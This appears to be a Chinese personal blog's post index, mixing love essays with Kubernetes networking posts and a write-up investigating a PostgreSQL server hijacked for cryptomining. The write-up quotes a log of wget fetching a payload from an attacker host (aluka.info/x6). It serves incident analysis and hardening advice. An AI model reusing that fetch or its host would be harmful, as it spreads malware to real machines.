你知不知道，有时候我脑洞很大，整个故事的来龙去脉，悲欢离合，我都想明白了，只是我还不能狠下心去告诉你，你一直在我理想生活的构建里。我多想告诉你我的秘密，我想把我所有感官，所有体验都分享给你，我是一个时刻沸腾着的人，永远滋滋地响，翻腾不休。但一想到你，小心翼翼地，我就能平静下来。 明天就是星期五了，我真怕你从此不再理我，希望你明天能开始理我，要不，你可以吃掉我。 ","date":"2019-08-01","objectID":"/zh-cn/cutanzi-panda/:0:0","tags":["Gossip"],"title":"大醋坛子熊猫侠","uri":"/zh-cn/cutanzi-panda/"},{"categories":["Gossip"],"content":"「你快看这朵云，舒张得恰巧。像刚出城堡骑着穿山甲的鹫鹰骑士，持着大枪冲向巨龙，刺破了一片天，天外的金光像流萤一样泄了出来」 刚在百老汇看完《旺角卡门》, 饿得五脊六兽, 急冲冲地想去家粤菜馆子点一碗炖鸡老汤。 记得第一次聊起这部电影，是给你写信后的两三周，你也说王家卫的电影里从来不会讲这俩人是因为什么爱上的，却好像都是无缘无故就爱上了。只有状态，毫无因果。 这难道不迷人吗，我天生爱这些没由头的东西，它们是弹丸偏离轨道击碎的窗户，只能听见其响，意识过来时，玻璃渣已碎了一地。这些难以琢磨的不期而至的碰撞，总是不经意地夺走你的时光，直到踩在玻璃渣上刺痛了脚才反应过来。 但我仍然好奇在长久的一段时间后，阿娥会不会反应过来，那个藏起来的杯子，一直没有被找到。从此以往地，便是像每一天这样灰暗愁闷的日子，也得爱，也得焦心。她得有多难过。 莱蒙托夫说「也许我爱的已不是你，而是对你付出的热情。就像是一座神庙，即使荒芜，仍然是祭坛。一座雕像，即使坍塌，仍然是神」 我最近又陷入了这种状态，第一次知悉你要去北方，不免觉得北方那么冷，由不得任性，满脑子叮嘱你得穿秋裤。 等我真正到了北方，才发现北方的冬天是下雪的，一点也不冷，有几片孤花趁着下雪天旺盛地生长，有猫咪对着窗台飘的雪花跳脚。我憋足了劲儿说，你们都盛开起来吧，把白茫茫一片裸露的大地撕裂，把沸腾的鲜血都撒在上面。约莫半载，雪地里开始飘出红色的花瓣，风却慢慢把这些玫瑰吹散，最后枯竭得像精卫填海，填不进白茫茫一片，精疲力竭。 再后来，屋子搬来了年轻人，像所有青年才俊一样，卯住劲投身入热枕中。就像你当时走过的路，我总想着这些发自内心的不愉悦却要被汲汲营营的名誉、条条框框的规则、战战兢兢的人情所淹没，就感到无比的孤独。 我看你像大部分的水滴一样，流入了那条大河里，川流地河水互相摩擦生热逐渐漫起水雾，那些浓浊的雾气徘徊在你我之间，我想它散开，因为我怕看不见你，我又想它永远在这，因为我怕看不见你。 就像基因编辑里人们趋之若鹜地想要拼接自己的 DNA 移植上最优的属性，巴不得是个天生的六边形战士，流水工厂式的繁殖，一代一代商品化的高级人，予取予求地寻找另一位六边形战士，聚群成一类分不清的基因链，齐步行走着，像是动物世界里驼铃的迁移。我暗暗期望你不会是那个空茫的人之一，能有间隙从真实人生中探出头放空出来，去做些心怡的事儿，也期望之中有人能游到更加真实的、离得不远的一些去处，逃离这些日复一日消磨着人的远足。 去粤菜馆子的路上，看着窗外，这座城市像上了发条一般运转，循规蹈矩，咿呀作响，日复一日地用同一种模式运营着所有公民。仿佛悬浮于城市上空仍有一台工业时代的冒着仙气的蒸汽机，张牙舞爪地喷射着火焰，热飒了熊猫侠。似乎北方的夏天远比冬天令人生厌得多，不知道你那儿今夜起风吗。 起风了，就该有云，云卷云舒，然后再被风吹散。 归途路上，又不禁胡思乱想，那时候听你说想看成都的云，巴不得把天空扯得稀碎，结果只剩下三三两两形单影只的几朵，经不起妄想。 飘飘然地，在归途路上，遇见了它，像奔向风车的骑士，喜欢极了，我多想你也看到这朵云。 于北京， 粤菜馆子路上， 肚子饿饿饿。 2019/07/27 ","date":"2019-07-27","objectID":"/zh-cn/i-want-you-to-see-this-sky/:0:0","tags":["Gossip","Bong"],"title":"我想你也看到这朵云","uri":"/zh-cn/i-want-you-to-see-this-sky/"},{"categories":["Code","Kubernetes"],"content":"背景 最近在升级集群的 kube-prxoy 并开启 ipvs mode, 引发了一些线上故障 ","date":"2019-04-29","objectID":"/zh-cn/kubeproxy-ipvs-accident/:1:0","tags":["Iptables","Kubernetes","Linux"],"title":"记一次升级 kube-proxy ipvs 引发的线上故障","uri":"/zh-cn/kubeproxy-ipvs-accident/"},{"categories":["Code","Kubernetes"],"content":"替换原因 由于豆瓣的集群使用 calico + kube-proxy iptables mode + puppet iptable 脚本管理 三个组件共同操作同一份 iptables, 容易出现 race condition 问题, 并且还会互相抢占 iptables 锁, 是个 Mutex unsafe 的操作, 不易于维护. 故打算尽量减少操作 iptables 的部分, 替换成 ipvs ","date":"2019-04-29","objectID":"/zh-cn/kubeproxy-ipvs-accident/:2:0","tags":["Iptables","Kubernetes","Linux"],"title":"记一次升级 kube-proxy ipvs 引发的线上故障","uri":"/zh-cn/kubeproxy-ipvs-accident/"},{"categories":["Code","Kubernetes"],"content":"事故回溯 @400000005cbea9a81eaf9164 W0423 13:58:54.514773 14016 server.go:195] WARNING: all flags other than --config, --write-config-to, and --cleanup are deprecated. Please begin using a config file ASAP. @400000005cbea9a81fe30854 W0423 13:58:54.534952 14016 server_others.go:287] Flag proxy-mode=\"\" unknown, assuming iptables proxy @400000005cbea9a81ff0bc24 I0423 13:58:54.535856 14016 server_others.go:140] Using iptables Proxier. @400000005cbea9a820d714e4 I0423 13:58:54.550947 14016 server_others.go:174] Tearing down inactive rules. @400000005cbea9a828a386bc I0423 13:58:54.681728 14016 server.go:448] Version: v1.11.1 @400000005cbea9a82be9b10c I0423 13:58:54.736441 14016 conntrack.go:98] Set sysctl 'net/netfilter/nf_conntrack_max' to 786432 @400000005cbea9a82be9b8dc I0423 13:58:54.736512 14016 conntrack.go:52] Setting nf_conntrack_max to 786432 @400000005cbea9a82be9b8dc I0423 13:58:54.736566 14016 conntrack.go:98] Set sysctl 'net/netfilter/nf_conntrack_tcp_timeout_established' to 86400 @400000005cbea9a82be9bcc4 I0423 13:58:54.736625 14016 conntrack.go:98] Set sysctl 'net/netfilter/nf_conntrack_tcp_timeout_close_wait' to 3600 @400000005cbea9a82bea457c I0423 13:58:54.736765 14016 config.go:202] Starting service config controller @400000005cbea9a82bea7074 I0423 13:58:54.736778 14016 controller_utils.go:1025] Waiting for caches to sync for service config controller @400000005cbea9a82bec31ac I0423 13:58:54.736850 14016 config.go:102] Starting endpoints config controller @400000005cbea9a82bec3594 I0423 13:58:54.736867 14016 controller_utils.go:1025] Waiting for caches to sync for endpoints config controller @400000005cbea9a831e37a0c I0423 13:58:54.836917 14016 controller_utils.go:1032] Caches are synced for service config controller @400000005cbea9a831e3dbb4 I0423 13:58:54.837000 14016 controller_utils.go:1032] Caches are synced for endpoints config controller @400000005cbea9aa0f11fe7c E0423 13:58:56.252807 14016 proxier.go:1340] Failed to delete stale service IP 172.19.119.127 connections, error: error deleting connection tracking state for UDP service IP: 172.19.119.127, error: error looking for path of conntrack: exec: \"conntrack\": executable file not found in $PATH @400000005cbea9aa0f12f494 E0423 13:58:56.252887 14016 proxier.go:1340] Failed to delete stale service IP 172.19.0.53 connections, error: error deleting connection tracking state for UDP service IP: 172.19.0.53, error: error looking for path of conntrack: exec: \"conntrack\": executable file not found in $PATH @400000005cbea9aa0f13b014 E0423 13:58:56.252939 14016 proxier.go:1340] Failed to delete stale service IP 172.19.68.99 connections, error: error deleting connection tracking state for UDP service IP: 172.19.68.99, error: error looking for path of conntrack: exec: \"conntrack\": executable file not found in $PATH Failed to delete stale service IP 172.19.68.99 connections, error: error deleting connection tracking state for UDP service IP: 172.19.68.99, error: error looking for path of conntrack: exec: \"conntrack\": executable file not found in $PATH = = 物理机上没装 conntrack 的包 = = 以及 WARNING: all flags other than --config, --write-config-to, and --cleanup are deprecated. Please begin using a config file ASAP. 替换时首先遇到了物理机未安装 conntrack 导致 kube-proxy 拉不起来的问题 接着在升级 kube-proxy 期间, 我通过 另起了 kube-proxy daemonset 执行了 docker exec -it $(docker ps | grep hyperkube | awk '{print $1 \" ./hyperkube kube-proxy --cleanup\"}' ) 逐步清理了集群节点上的 iptables 规则. 此时便发生了线上故障. 归因为网络不通. podip 互 ping 丢包. 后续排查发现, 发现故障节点因为清理缘故 iptables 中少了这一条规则, docker bridge network 下的 container 向外发包时，没有做 SNAT, 对端收到包但无法正确回包，导致通信失败 -A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -j MASQUERADE 故所有依赖 docker0 访问的非 k8s container 均出现了网络异常. ","date":"2019-04-29","objectID":"/zh-cn/kubeproxy-ipvs-accident/:3:0","tags":["Iptables","Kubernetes","Linux"],"title":"记一次升级 kube-proxy ipvs 引发的线上故障","uri":"/zh-cn/kubeproxy-ipvs-accident/"},{"categories":["Code","Kubernetes"],"content":"解决办法 临时在节点上批量执行以下脚本刷上 iptables 规则 sudo iptables -t nat -I POSTROUTING 3 -s 172.17.0.0/16 ! -o docker0 -j MASQUERADE ","date":"2019-04-29","objectID":"/zh-cn/kubeproxy-ipvs-accident/:4:0","tags":["Iptables","Kubernetes","Linux"],"title":"记一次升级 kube-proxy ipvs 引发的线上故障","uri":"/zh-cn/kubeproxy-ipvs-accident/"},{"categories":["Code","Kubernetes"],"content":"额外引发的另一个 dns 查询黑洞事故 在升级 kube-proxy ipvs mode 后, 意外发现每当 coredns down 重启后, 必定出现短暂的 dns query 异常并伴随着一波 502. 总结原因如下: 当执行 kube-proxy 升级时会 drain k8s 节点 drain node –\u003e evict 掉节点 coredns pod 时 kubeproxy 来不及删掉旧的规则导致 ipvs rules 里仍有一条不存在后端的 realserver , 导致请求走到这条规则后 dns 解析进黑洞直到 5s timeout kube-proxy 会先把要删除的 rs 权重置为0，然后加入到待删除 rs list 里由另一个 1mins 周期的循环来删，但在删除逻辑中如果仍有连接保持着则会出现删除失败但权重为0的过渡期，这期间便是有问题的, 会带来短暂的不可用 I0514 16:23:54.047540 1 graceful_termination.go:160] Trying to delete rs: 172.19.0.53:53/UDP/172.18.81.97:53 I0514 16:23:54.047603 1 graceful_termination.go:171] Not deleting, RS 172.19.0.53:53/UDP/172.18.81.97:53: 0 ActiveConn, 3 InactiveConn I0514 16:23:54.260987 1 graceful_termination.go:160] Trying to delete rs: 172.19.0.53:9153/TCP/172.18.81.97:9153 I0514 16:23:54.261050 1 graceful_termination.go:174] Deleting rs: 172.19.0.53:9153/TCP/172.18.81.97:9153 I0514 16:23:54.437893 1 graceful_termination.go:160] Trying to delete rs: 172.19.0.53:53/TCP/172.18.81.97:53 I0514 16:23:54.437952 1 graceful_termination.go:174] Deleting rs: 172.19.0.53:53/TCP/172.18.81.97:53 I0514 16:24:09.602189 1 graceful_termination.go:160] Trying to delete rs: 172.19.0.53:53/UDP/172.18.81.97:53 I0514 16:24:09.602330 1 graceful_termination.go:171] Not deleting, RS 172.19.0.53:53/UDP/172.18.81.97:53: 0 ActiveConn, 2 InactiveConn I0514 16:25:09.602466 1 graceful_termination.go:160] Trying to delete rs: 172.19.0.53:53/UDP/172.18.81.97:53 I0514 16:25:09.602601 1 graceful_termination.go:171] Not deleting, RS 172.19.0.53:53/UDP/172.18.81.97:53: 0 ActiveConn, 2 InactiveConn I0514 16:26:09.602770 1 graceful_termination.go:160] Trying to delete rs: 172.19.0.53:53/UDP/172.18.81.97:53 I0514 16:26:09.602917 1 graceful_termination.go:171] Not deleting, RS 172.19.0.53:53/UDP/172.18.81.97:53: 0 ActiveConn, 2 InactiveConn I0514 16:27:09.603060 1 graceful_termination.go:160] Trying to delete rs: 172.19.0.53:53/UDP/172.18.81.97:53 I0514 16:27:09.603182 1 graceful_termination.go:171] Not deleting, RS 172.19.0.53:53/UDP/172.18.81.97:53: 0 ActiveConn, 1 InactiveConn 直到所有连接都释放后才能正常删除 I0514 16:37:09.605442 1 graceful_termination.go:174] Deleting rs: 172.19.0.53:53/UDP/172.18.79.142:53 I0514 16:37:09.605468 1 graceful_termination.go:93] lw: remote out of the list: 172.19.0.53:53/UDP/172.18.79.142:53 ","date":"2019-04-29","objectID":"/zh-cn/kubeproxy-ipvs-accident/:5:0","tags":["Iptables","Kubernetes","Linux"],"title":"记一次升级 kube-proxy ipvs 引发的线上故障","uri":"/zh-cn/kubeproxy-ipvs-accident/"},{"categories":["Code","Kubernetes"],"content":"解决办法 有 coredns 加上 fallback dns 服务以及 lvs 探活 确保 health check 过了才会正常打入后端 ","date":"2019-04-29","objectID":"/zh-cn/kubeproxy-ipvs-accident/:6:0","tags":["Iptables","Kubernetes","Linux"],"title":"记一次升级 kube-proxy ipvs 引发的线上故障","uri":"/zh-cn/kubeproxy-ipvs-accident/"},{"categories":["Code","Kubernetes"],"content":"Lexus Lee ","date":"2018-09-14","objectID":"/zh-cn/k8s-service-endpoints/:0:0","tags":["Golang","Kubernetes","Linux"],"title":"浅谈 k8s service\u0026kube-proxy","uri":"/zh-cn/k8s-service-endpoints/"},{"categories":["Code","Kubernetes"],"content":"背景 最开始听到同事 k8s 分享时比较困惑我的一个问题是 k8s 怎么实现一个私有 ip(虚拟 ip，以下简称 vip)到另一个私有ip收发包的。 不过其实我想知道的应该是 k8s 通信机制，它是怎么实现服务发现的，新建的 pod 是怎么感知到的，万一有些 pod 节点变更 vip 变了 k8s 是如何感知的。 基于这个问题，做一下关于 k8s service\u0026kube-proxy 的分享。 ","date":"2018-09-14","objectID":"/zh-cn/k8s-service-endpoints/:0:1","tags":["Golang","Kubernetes","Linux"],"title":"浅谈 k8s service\u0026kube-proxy","uri":"/zh-cn/k8s-service-endpoints/"},{"categories":["Code","Kubernetes"],"content":"Service\u0026kube-proxy 概述 首先我建了一个 replcas = 4 lebel: app=service_test_pod的 python server deployment 来打出当前 pod 的 Hostname apiVersion:apps/v1kind:Deploymentmetadata:name:service-testspec:replicas:4selector:matchLabels:app:service_test_podtemplate:metadata:labels:app:service_test_podspec:containers:- name:simple-httpimage:python:2.7imagePullPolicy:IfNotPresentcommand:[\"/bin/bash\"]args:[\"-c\",\"echo \\\"\u003cp\u003eHello from $(hostname)\u003c/p\u003e\\\" \u003e index.html; python -m SimpleHTTPServer 9999\"]ports:- name:httpcontainerPort:9999 可以看到启动了4个 pod service-test-69764ddb4c-4hr2x 1/1 Running 0 8s 172.18.234.21 brand6 service-test-69764ddb4c-gstft 1/1 Running 0 8s 172.18.83.225 belba2 service-test-69764ddb4c-nnv29 1/1 Running 0 8s 172.18.156.140 brand2 service-test-69764ddb4c-vx5pn 0/1 ContainerCreating 0 8s \u003cnone\u003e belba3 我必须挨个 curl 才能得到他们的 hostname lilingzhi@belba1 ~/k8s/test $ curl 172.18.234.21:9999 \u003cp\u003eHello from service-test-69764ddb4c-4hr2x\u003c/p\u003e 但不能让其他 pod 直接通过 vip 访问这些 pod ，需要一个更上层的一个抽象，把这4个提供相同服务的 pod 打包成一个对外的服务，通过某个入口地址来访问它，并且把请求均衡到4个pod上，这样一层的抽象包装是实现一个服务网络(service mesh)的基础。 而 k8s service 就是做这个的。 首先我们来看下什么是 k8s service: A Kubernetes Service is an abstraction which defines a logical set of Pods and a policy by which to access them - sometimes called a micro-service. The set of Pods targeted by a Service is (usually) determined by a Label Selector (see below for why you might want a Service without a selector) 而打包pod成service并发布的微服务得支持 k8s 内部及外部的访问。 故 k8s service 提供了以下三种暴露 service 入口的模式: ClusterIP: use a cluster-internal IP only - this is the default and is discussed above. Choosing this value means that you want this service to be reachable only from inside of the cluster. NodePort: on top of having a cluster-internal IP, expose the service on a port on each node of the cluster (the same port on each node). You’ll be able to contact the service on any :NodePort address. LoadBalancer: on top of having a cluster-internal IP and exposing service on a NodePort also, ask the cloud provider for a load balancer which forwards to the Service exposed as a :NodePort for each Node. 可以简单理解为 ClusterIp 是提供对内的访问入口，NodePort 和 LoadBalancer 是提供对外的，不过 LoadBalancer 是在暴露 NodePort 基础上提供可以接入外部的 LB。 那么我新建一个 service 给刚刚的 4 个 pod lilingzhi@belba1 ~/k8s/test $ kubectl expose deployment service-test --type=\"NodePort\" --port 9098 --target-port=9999 service/service-test exposed 可以看到 lilingzhi@belba1 ~/k8s/test $ kubectl get service -o wide NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE SELECTOR service-test NodePort 172.19.97.3 \u003cnone\u003e 9098:30255/TCP 16s app=service_test_pod service-test 这儿就映射到 clusterIp 的 172.19.97.3:9098 端口上 再看下 endpoints lilingzhi@belba1 ~/k8s/test $ kubectl get endpoints -o wide NAME ENDPOINTS AGE service-test 172.18.156.140:9999,172.18.193.66:9999,172.18.234.21:9999 + 1 more... 3m 可以看到也建了一个包含 4个 host:port 的元组的 endpoint 通过不断 curl service ip:port 会发现请求已经均衡到4个 pod 上了 lilingzhi@belba1 ~/k8s/test $ curl 172.19.97.3:9098 \u003cp\u003eHello from service-test-69764ddb4c-4hr2x\u003c/p\u003e lilingzhi@belba1 ~/k8s/test $ curl 172.19.97.3:9098 \u003cp\u003eHello from service-test-69764ddb4c-gstft\u003c/p\u003e lilingzhi@belba1 ~/k8s/test $ curl 172.19.97.3:9098 \u003cp\u003eHello from service-test-69764ddb4c-4hr2x\u003c/p\u003e lilingzhi@belba1 ~/k8s/test $ curl 172.19.97.3:9098 \u003cp\u003eHello from service-test-69764ddb4c-gstft\u003c/p\u003e 由于 k8s service 路由是通过 kube-proxy 决定的，默认是走的 iptables 转发的(可换成用户态 proxy 或 ipvs)，所以查一下相应的 iptables 规则 $ sudo iptables -L -v -n -t nat Chain KUBE-SERVICES (2 references) 0 0 KUBE-MARK-MASQ tcp -- * * !172.18.0.0/16 172.19.97.3 /* default/service-test: cluster IP */ tcp dpt:9098 0 0 KUBE-SVC-LY73ZDGF4KGO4YFJ tcp -- * * 0.0.0.0/0 172.19.97.3 /* default/service-test: cluster IP */ tcp dpt:9098 看到有条 chain KUBE-SVC-LY73ZDGF4KGO4YFJ 定义了 service-test 的转发规则，于是查看相应的 chain Chain KUBE-SVC-LY73ZDGF4KGO4YFJ (2 references) pkts bytes target prot opt in out source destination 0 0 KUBE-SEP-2T6K76SEPIPV3QKW all -- * * 0.0.0.0/0 0.0.0.0/0 /* default/service-test: */ statistic mode random probability 0.25000000000 0 0 KUBE-SEP-75XULILUFIH","date":"2018-09-14","objectID":"/zh-cn/k8s-service-endpoints/:0:2","tags":["Golang","Kubernetes","Linux"],"title":"浅谈 k8s service\u0026kube-proxy","uri":"/zh-cn/k8s-service-endpoints/"},{"categories":["Code","Kubernetes"],"content":"kube-proxy 源码分析 因为 kube-proxy 源码相对比较少，所以读了下源码，但还是蛮复杂的 kube-proxy 会作为 daemon 跑在每个节点上，对 api-server 中的 service \u0026 endpoint 进行 watch ,一旦检测到更新则往 iptables 里全量推送新的转发规则，那么我们根据 kubernetes/cmd/kube-proxy/proxy.go 里找到 kube-proxy 真正的入口函数 Run() func (s *ProxyServer) Run() error { ... serviceConfig := config.NewServiceConfig(informerFactory.Core().V1().Services(), s.ConfigSyncPeriod) serviceConfig.RegisterEventHandler(s.ServiceEventHandler) go serviceConfig.Run(wait.NeverStop) endpointsConfig := config.NewEndpointsConfig(informerFactory.Core().V1().Endpoints(), s.ConfigSyncPeriod) endpointsConfig.RegisterEventHandler(s.EndpointsEventHandler) go endpointsConfig.Run(wait.NeverStop) // This has to start after the calls to NewServiceConfig and NewEndpointsConfig because those // functions must configure their shared informer event handlers first. go informerFactory.Start(wait.NeverStop) // Birth Cry after the birth is successful s.birthCry() // Just loop forever for now... s.Proxier.SyncLoop() return nil } 这就是 kube-proxy 的入口函数，实际上即起一个 proxy server daemon 可以看到通过 informerFactory 新建了2个 config 对象(serviceConfig, endpointsConfig), 这个 informerFactory 是什么呢？ k8s 里所有资源都存在 etcd 中提供 api 通过 apiserver 的接口访问，其中有个核心的公共组件即 informer 是对 apiserver 资源访问的一层包装，其中包括 api 访问, localcache 等… 所以这里的两个 config 对象即用来获取 etcd 中 service 和 endpoints 的信息，他们都调用了 RegisterEventHandler 注册了一个回调函数，这个函数用来监听变更并发送变更信号。 最后用 goroutine 跑起来。 之后的 informerFactory.Start() 则用来初始化 informer 对象注册的回调函数。 最后把 proxy server loop 跑起来 Proxier.SyncLoop() 等待信号。 接着我们先看下 service 的 NewServiceConfig 这个函数，因为 endpoint 估计也是类似的。 // NewServiceConfig creates a new ServiceConfig. func NewServiceConfig(serviceInformer coreinformers.ServiceInformer, resyncPeriod time.Duration) *ServiceConfig { result := \u0026ServiceConfig{ lister: serviceInformer.Lister(), listerSynced: serviceInformer.Informer().HasSynced, } serviceInformer.Informer().AddEventHandlerWithResyncPeriod( cache.ResourceEventHandlerFuncs{ AddFunc: result.handleAddService, UpdateFunc: result.handleUpdateService, DeleteFunc: result.handleDeleteService, }, resyncPeriod, ) return result } 看到它结构体里就两个对象 lister 和 listerSynced，所以我们接着看下 serviceInformer type ServiceInformer interface { Informer() cache.SharedIndexInformer Lister() v1.ServiceLister } 看到是个通用对象 SharedIndexInformer 即上述提及的公共组件，故不往里深究。 接着回来看注册进去的回调函数，举个栗子，这儿的 UpdateFunc: result.handleUpdateService 最终会调到 iptables.go 里的 OnServiceUpdate func (c *ServiceConfig) handleUpdateService(oldObj, newObj interface{}) { oldService, ok := oldObj.(*v1.Service) if !ok { utilruntime.HandleError(fmt.Errorf(\"unexpected object type: %v\", oldObj)) return } service, ok := newObj.(*v1.Service) if !ok { utilruntime.HandleError(fmt.Errorf(\"unexpected object type: %v\", newObj)) return } for i := range c.eventHandlers { glog.V(4).Infof(\"Calling handler.OnServiceUpdate\") c.eventHandlers[i].OnServiceUpdate(oldService, service) } } func (proxier *Proxier) OnServiceUpdate(oldService, service *v1.Service) { if proxier.serviceChanges.Update(oldService, service) \u0026\u0026 proxier.isInitialized() { proxier.syncRunner.Run() } } 所以监听到变更之后调用的这个 proxier.syncRunner.Run() 是什么呢，得看下这个 syncRunner 在做什么 proxier.syncRunner = async.NewBoundedFrequencyRunner(\"sync-runner\", proxier.syncProxyRules, minSyncPeriod, syncPeriod, burstSyncs) func (bfr *BoundedFrequencyRunner) Run() { // If it takes a lot of time to run the underlying function, noone is really // processing elements from \u003crun\u003e channel. So to avoid blocking here on the // putting element to it, we simply skip it if there is already an element // in it. select { case bfr.run \u003c- struct{}{}: default: } } func (bfr *BoundedFrequencyRunner) Loop(stop \u003c-chan struct{}) { glog.V(3).Infof(\"%s Loop running\", bfr.name) bfr.timer.Reset(bfr.maxInterval) for { select { case \u003c-stop: bfr.stop() glog.V(3).Infof(\"%s Loop stopping\", bfr.name) return case \u003c-bfr.timer.C(): bfr.tryRun() case \u003c-bfr.run: bfr.tryRun() } } } syncRunner 里注册了个 syncProxyRules 的回调函数，而刚刚 updateSync 中触发的 run 函数则用 select 发送了一个 bfr.run 信号，之前所提及的 proxy server 一旦收到","date":"2018-09-14","objectID":"/zh-cn/k8s-service-endpoints/:0:3","tags":["Golang","Kubernetes","Linux"],"title":"浅谈 k8s service\u0026kube-proxy","uri":"/zh-cn/k8s-service-endpoints/"},{"categories":["Code","Kubernetes"],"content":"最后 最后我们来理一下 service \u0026\u0026 endpoint \u0026\u0026 kube-proxy 的关系。 service / endpoint 是pod对外暴露访问地址的封装，Kube-proxy 用来管理这些封装，做一些 ensure\u0026update 的操作 ","date":"2018-09-14","objectID":"/zh-cn/k8s-service-endpoints/:0:4","tags":["Golang","Kubernetes","Linux"],"title":"浅谈 k8s service\u0026kube-proxy","uri":"/zh-cn/k8s-service-endpoints/"},{"categories":["Security","Linux"],"content":"背景 今天下午连续收到了腾讯云 CPU overload 报警 登服务器一看, 有个 postgres 账户跑的进程把 CPU 占满了，进程名特别奇怪。 ","date":"2018-08-11","objectID":"/zh-cn/scarllet-sql-attack/:0:1","tags":["Security","Linux"],"title":"记一次 postgresql 斯嘉丽约翰逊攻击的排查","uri":"/zh-cn/scarllet-sql-attack/"},{"categories":["Security","Linux"],"content":"排查 于是根据 pid 到 /proc/20619/stack 下看到有一长串的 [\u003cffffffff81841ff2\u003e] entry_SYSCALL_64_fastpath+0x16/0x71 ，似乎短时间里发起大量的系统调用(prepare)并且还在不断增长。 接着 cat /proc/20619/cmdline 发现执行的是 /var/lib/postgresql/9.5/main/Ac2p018-0 这个坏家伙，查看发现这是个二进制文件，看不出问题，猜测和 postgresql 数据库有关，看起来不像是什么数据库维护脚本，第一反应是被数据库攻击了，于是查看 /var/lib/postgresql/.bash_history 和 /var/lib/postgresql/.psql_history 发现一条记录都没，显然是被手动清空了，更加确定是被 hack 了。担心已经被拿到 root 权限了，于是通过 lastlog 和 last 查看登录状态，所幸之前的 root 账户的 ip 都是我自己的，只有 postgres 这个账户看起来异常。 接着到 /var/lib/postgresql/9.5/main/pg_log 下查看数据库日志，抓到了几个奇怪的地方： 有一个长连接持续从 http://aluka.info/x6 下载文件， 5144 --2018-08-11 15:47:30-- http://aluka.info/x6 5145 Resolving aluka.info (aluka.info)... 103.27.110.206 5146 Connecting to aluka.info (aluka.info)|103.27.110.206|:80... connected. 5147 HTTP request sent, awaiting response... 200 OK 5148 Length: 2758655 (2.6M) 5149 Saving to: ‘xmm’ 5150 5151 0K .......... .......... .......... .......... .......... 1% 399K 7s 5152 50K .......... .......... .......... .......... .......... 3% 601K 5s 5153 100K .......... .......... .......... .......... .......... 5% 592K 5s 5154 150K .......... .......... .......... .......... .......... 7% 1.69M 4s 5155 200K .......... .......... .......... .......... .......... 9% 754K 4s 5156 250K .......... .......... .......... .......... .......... 11% 422K 4s 5157 300K .......... .......... .......... .......... .......... 12% 405K 4s 5158 350K .......... .......... .......... .......... .......... 14% 179K 5s 5159 400K .......... .......... .......... .......... .......... 16% 81.1K 8s 5160 450K .......... .......... .......... .......... .......... 18% 35.1K 13s 5161 500K .......... .......... .......... .......... .......... 20% 117K 13s 5162 550K .......... .......... .......... .......... .......... 22% 86.3K 14s 5163 600K .......... .......... .......... .......... .......... 24% 122K 14s 5164 650K .......... .......... .......... .......... .......... 25% 169K 13s 5165 700K .......... .......... .......... .......... .......... 27% 171K 13s 5166 750K .......... .......... .......... .......... .......... 29% 93.8K 13s 5167 800K .......... .......... .......... .......... .......... 31% 94.9K 13s 5168 850K .......... .......... .......... .......... .......... 33% 101K 13s 5169 900K .......... .......... .......... .......... .......... 35% 53.6K 14s 5170 950K .......... .......... .......... .......... .......... 37% 94.3K 14s 5171 1000K .......... .......... .......... .......... .......... 38% 77.0K 13s 5172 1050K .......... .......... .......... .......... .......... 40% 73.6K 13s 5173 1100K .......... .......... .......... .......... .......... 42% 97.2K 13s 5174 1150K .......... .......... .......... .......... .......... 44% 130K 13s 5175 1200K .......... .......... .......... .......... .......... 46% 194K 12s 5176 1250K .......... .......... .......... .......... .......... 48% 173K 12s 5177 1300K .......... .......... .......... .......... .......... 50% 109K 11s 5178 1350K .......... .......... .......... .......... .......... 51% 82.9K 11s 5179 1400K .......... .......... .......... .......... .......... 53% 134K 10s 5180 1450K .......... .......... .......... .......... .......... 55% 106K 10s 5181 1500K .......... .......... .......... .......... .......... 57% 188K 10s 5182 1550K .......... .......... .......... .......... .......... 59% 51.4K 9s 5183 1600K .......... .......... .......... .......... .......... 61% 54.6K 9s 5184 1650K .......... .......... .......... .......... .......... 63% 86.8K 9s 5185 1700K .......... .......... .......... .......... .......... 64% 160K 8s 5186 1750K .......... .......... .......... .......... .......... 66% 97.9K 8s 5187 1800K .......... .......... .......... .......... .......... 68% 153K 8s 5188 1850K .......... .......... .......... .......... .......... 70% 127K 7s 5189 1900K .......... .......... .......... .......... .......... 72% 117K 7s 5190 1950K .......... .......... .......... .......... .......... 74% 63.8K 6s ","date":"2018-08-11","objectID":"/zh-cn/scarllet-sql-attack/:0:2","tags":["Security","Linux"],"title":"记一次 postgresql 斯嘉丽约翰逊攻击的排查","uri":"/zh-cn/scarllet-sql-attack/"},{"categories":["Security","Linux"],"content":"反思 这次主要的原因是 postgres 配置权限时偷懒导致服务器变成挖矿僵尸。 postgres pg_hba.conf 里的用户认证 method 应改成 md5 方式 数据库 superuser 只配置只能 local 访问禁止远程访问 腾讯云安全组里数据库端口 outbound 应尽量限制 ip 段 ","date":"2018-08-11","objectID":"/zh-cn/scarllet-sql-attack/:0:3","tags":["Security","Linux"],"title":"记一次 postgresql 斯嘉丽约翰逊攻击的排查","uri":"/zh-cn/scarllet-sql-attack/"},{"categories":["Architecture","Code"],"content":"坦率地讲 服务熔断 \u0026 服务降级 ","date":"2018-02-01","objectID":"/zh-cn/service-fallback/:1:0","tags":["Service","Architecture","Linux"],"title":"坦率地讲 服务熔断 \u0026 服务降级","uri":"/zh-cn/service-fallback/"},{"categories":["Architecture","Code"],"content":"背景 之前遇到个问题，发现一个系统如果拆分了太多业务类服务，或者依赖于大量的第三方服务，就很容易因为某个服务的故障导致整个系统不可用，比如 模块中使用了 Elastic Search 进行监控，但是 ES 突然挂了，相关的 api 的调用报错导致级联的服务全部阻塞，那么应该要有规避由 ES 调用 raise 出的异常或者调用超时而导致整个模块或整个系统崩溃的保护措施。 使用 AWS 或 阿里云 的 ECS 服务来作为 micro-service 的载体，但是 ECS 服务故障或者过载了导致整个业务链无法正常进行，那么应有对应的降级或者限制调用频度的方案来进行保护。 ","date":"2018-02-01","objectID":"/zh-cn/service-fallback/:1:1","tags":["Service","Architecture","Linux"],"title":"坦率地讲 服务熔断 \u0026 服务降级","uri":"/zh-cn/service-fallback/"},{"categories":["Architecture","Code"],"content":"服务熔断 服务熔断和电路熔断是一个道理，如果一条线路电压过高，保险丝会熔断，防止出现火灾，但是过后重启仍然是可用的。 而服务熔断则是对于目标服务的请求和调用大量超时或失败，这时应该熔断该服务的所有调用，并且对于后续调用应直接返回，从而快速释放资源，确保在目标服务不可用的这段时间内，所有对它的调用都是立即返回，不会阻塞的。再等到目标服务好转后进行接口恢复。 